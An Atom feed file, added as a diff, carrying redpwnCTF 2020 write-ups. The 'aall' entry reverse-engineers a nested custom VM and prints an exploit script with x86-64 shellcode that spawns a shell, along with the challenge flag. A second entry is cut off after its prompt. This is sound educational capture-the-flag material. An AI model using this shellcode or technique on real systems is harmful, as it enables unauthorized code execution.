@@ -1,0 +1,203 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title> - redpwnctf20</title>
+	<link href="/tags/redpwnctf20/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2020-06-25T00:00:00+00:00</updated>
+	<id>/tags/redpwnctf20/atom.xml</id>
+	<entry xml:lang="en">
+		<title>redpwnCTF - aall</title>
+		<published>2020-06-25T00:00:00+00:00</published>
+		<updated>2020-06-25T00:00:00+00:00</updated>
+		<link href="/posts/redpwnctf20-aall/" type="text/html"/>
+		<id>/posts/redpwnctf20-aall/</id>
+		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;how many layers of vm are you on&lt;&#x2F;p&gt;
+&lt;p&gt;like,, maybe 5, or 6 right now my dude&lt;&#x2F;p&gt;
+&lt;p&gt;you are like a baby... watch this&lt;&#x2F;p&gt;
+&lt;p&gt;nc 2020.redpwnc.tf 31755&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;We&#x27;re also given a &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;f6fc3f9cf62155b95868bac16a40ba5a#file-aall-py&quot;&gt;python file&lt;&#x2F;a&gt; and a 
+&lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;f6fc3f9cf62155b95868bac16a40ba5a#file-dockerfile&quot;&gt;Dockerfile&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;decoding&quot;&gt;Decoding&lt;&#x2F;h1&gt;
+&lt;p&gt;Looking at the python file shows that it writes out a file named &lt;code&gt;breakout.aallo&lt;&#x2F;code&gt; and calls &lt;code&gt;exec&lt;&#x2F;code&gt; on a string after 
+base64-decoding and lzma-uncompressing it. We can modify the file to save the executed file to disk instead. 
+It&#x27;s a &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;0cba74ad88e43442154dd341979c9b6d&quot;&gt;python script&lt;&#x2F;a&gt;, but all of the variables are 
+random unicode characters. Although the python interpreter is happy to run the code, it&#x27;s nearly impossible to understand. &lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;I wrote a small script to replace all of the unicode characters with a different name:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mapping &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;dict&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;()
+counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;decompressed:
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;128&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if not &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mapping:
+            mapping[c] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;v&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(counter)
+            counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mapping[c].encode()
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+        final &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;([c])
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;unpacked1.py&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;wb&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;).write(final)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This results in a &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;d495f27076450822e0fc4f6cd4dbc62c&quot;&gt;slightly easier to read file&lt;&#x2F;a&gt;:&lt;&#x2F;p&gt;
+&lt;p&gt;I went ahead and renamed all of the variables and cleaned up the file. The &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;cce2544f70b8283309ac088d274b3b06&quot;&gt;resulting file&lt;&#x2F;a&gt; 
+was clearly an interpreter. An interpreted program is passed through argv, which is then loaded into interpreter memory 
+(an array). The first two bytes of the program contain the address to start interpreting at.&lt;&#x2F;p&gt;
+&lt;p&gt;The interpreter isn&#x27;t too complicated, but it has an interesting instruction &lt;code&gt;%&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;instr_type &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;%&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+    idd &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(memory[registers[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;ip&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]:]) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;48
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mmapped &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mmap.mmap(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, mmap.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;PAGESIZE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, prot&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mmap.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;PROT_READ &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mmap.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;PROT_WRITE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;mmap.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;PROT_EXEC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    c_functype &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int)
+    v3v17v25v21 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ctypes.c_void_p.from_buffer(mmapped)
+    function &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;c_functype(ctypes.addressof(v3v17v25v21))
+    v3v19v57v10 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(memory[registers[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;ip&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]:]).replace(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    mmapped.write(v3v19v57v10)
+    retVal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;function(idd)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;del &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;v3v17v25v21
+    mmapped.close()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This instruction mmaps a new block of memory, loads the memory following the instruction pointer&#x27;s current position, 
+and executes it. This means if we somehow insert shellcode into memory, we can execute by using this opcode.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;breakout-aall&quot;&gt;breakout.aall&lt;&#x2F;h2&gt;
+&lt;p&gt;We also have the file &lt;code&gt;breakout.aall&lt;&#x2F;code&gt; which is the program interpreted by this interpreter. I wrote a script to print 
+&lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;srikavin&#x2F;8c49d2d8c90d9f09aa6e6b5ed771c803&quot;&gt;a disassembly&lt;&#x2F;a&gt; of this file. This program, when 
+executed by the interpreter (which is executed by the python interpreter), loads the string 
+&lt;code&gt;https:&#x2F;&#x2F;aaronesau.com&#x2F;files&#x2F;objectively-wrong.png&lt;&#x2F;code&gt; into memory, and then accepts user input.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;breakout.aall&lt;&#x2F;code&gt; acts as an interpreter itself. It has five instructions:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;gt;&lt;&#x2F;code&gt; which increments the stack pointer&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;&lt;&#x2F;code&gt; which decrements the stack pointer&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;+&lt;&#x2F;code&gt; which increments the value at the stack pointer (dereferences the stack pointer and increments the value)&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;-&lt;&#x2F;code&gt; which decrements the value at the stack pointer&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;?&lt;&#x2F;code&gt; which acts as a NOP&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;We can use &lt;code&gt;breakout.aall&lt;&#x2F;code&gt; to write values to memory. Since, the opcodes for &lt;code&gt;breakout.aall&lt;&#x2F;code&gt; is also stored in memory, 
+we can modify the executed opcodes to include a &lt;code&gt;%&lt;&#x2F;code&gt; instruction to execute shellcode. &lt;&#x2F;p&gt;
+&lt;p&gt;The approach is clear: write shellcode to memory, then overwrite parts of &lt;code&gt;breakout.aal&lt;&#x2F;code&gt; in memory to jump to the shellcode.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;payload-generation&quot;&gt;Payload Generation&lt;&#x2F;h1&gt;
+&lt;p&gt;Conveniently, &lt;code&gt;breakout.aall&lt;&#x2F;code&gt; has a NOP instruction that we can overwrite to &lt;code&gt;%&lt;&#x2F;code&gt; to call shellcode. I wrote a script to 
+generate the payload:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;sp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1469
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;move_sp_to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(goal):
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;sp
+
+    old_sp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;sp
+    sp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;goal
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;goal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;old_sp:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;#39;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;goal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;old_sp:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(goal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;old_sp)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;goal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;old_sp:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;lt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(old_sp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;goal)
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;write_val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(index, value, initial_value&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;):
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;sp
+
+    ret &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;move_sp_to(index)
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;initial_value:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ret
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;initial_value:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ret &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;+&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(value &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;initial_value)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;initial_value:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ret &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;-&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(initial_value &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;value)
+
+
+payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&amp;quot;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;previous &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\x01\x00\x8a\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;https:&#x2F;&#x2F;aaronesau.com&#x2F;files&#x2F;ob&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;shellcode &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(shellcode)
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# % INSTR AT 1398
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;write_val(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1398&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x25&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# write payload
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;shellcode:
+    payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;write_val(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1400 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i, b, previous[i])
+    i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# trigger shellcode
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;?&amp;quot;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(payload)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Since we can only increment and decrement the values at certain locations, I included the values at the memory location before running the script, so that those addresses could be incremented&#x2F;decremented appropriately.&lt;&#x2F;p&gt;
+&lt;p&gt;Piping the output from this script into the program gives us a shell, and we can get the flag:
+&lt;code&gt;flag{b1ng0!_obl1g4t0ry-sh1tty-cust0m_4rch_ch4l-ftw}&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>redpwnCTF - tux fanpage</title>
+		<published>2020-06-25T00:00:00+00:00</published>
+		<updated>2020-06-25T00:00:00+00:00</updated>
+		<link href="/posts/redpwnctf20-tux-fanpage/" type="text/html"/>
+		<id>/posts/redpwnctf20-tux-fanpage/</id>
+		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;My friend made a fanpage for Tux; can you steal the source code for me?&lt;&#x2F;p&gt;
+&lt;p&gt;Site: &lt;a href=&quot;http:&#x2F;&#x2F;tux-fanpage.2020.redpwnc.tf&quot;&gt;tux-fanpage.2020.redpwnc.tf&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;We&#x27;re also given the source code:&lt;&#x2F;p&gt;
